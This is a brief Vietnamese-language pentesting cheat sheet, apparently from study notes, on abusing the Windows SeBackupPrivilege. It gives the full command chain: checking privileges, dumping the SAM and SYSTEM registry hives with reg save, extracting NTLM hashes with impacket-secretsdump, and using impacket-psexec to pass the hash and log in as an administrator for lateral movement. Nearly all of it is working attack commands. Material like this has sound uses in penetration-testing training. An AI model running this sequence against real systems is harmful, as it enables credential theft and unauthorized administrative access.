# SeBackupPrivilege

## Điểm chính khai thác

* Khai thác **SeBackupPrivilege** để truy cập và trích xuất các hive registry **SYSTEM** và **SAM**, chứa cấu hình hệ thống và dữ liệu tài khoản người dùng, bao gồm NTLM hashes
* Các NTLM hashes trích xuất từ SAM hive có thể được sử dụng trong tấn công **pass-the-hash** để xác thực với tư cách người dùng đặc quyền (như Administrator) mà không cần mật khẩu plaintext
* Kỹ thuật này đặc biệt hiệu quả trong môi trường Active Directory, nơi tài khoản quản trị cục bộ (như Administrator hoặc daveadmin) có thể được sử dụng để di chuyển ngang

***

## Các bước khai thác

### Kiểm tra lỗ hổng

Kiểm tra quyền **SeBackupPrivilege** của tài khoản hiện tại để xác định khả năng khai thác:

```
whoami /priv
```

***

### Thực thi khai thác

Sao lưu hive **SYSTEM** vào thư mục do người dùng kiểm soát để lấy dữ liệu cấu hình hệ thống và khóa mật mã:

```
reg save HKLM\SYSTEM SYSTEM
```

Sao lưu hive **SAM** vào thư mục do người dùng kiểm soát để lấy dữ liệu tài khoản người dùng, bao gồm NTLM hashes:

```
reg save HKLM\SAM SAM
```

Tải các hive **SYSTEM** và **SAM** về máy Kali để trích xuất NTLM hashes

Trích xuất NTLM hashes từ các hive bằng **impacket-secretsdump** trên máy Kali:

```
impacket-secretsdump -sam SAM -system SYSTEM LOCAL
```

Thực hiện tấn công **pass-the-hash** với NTLM hash để xác thực với tư cách người dùng đặc quyền:

{% code overflow="wrap" %}

```
impacket-psexec -hashes :<hash> <user>@<ip>
```

{% endcode %}
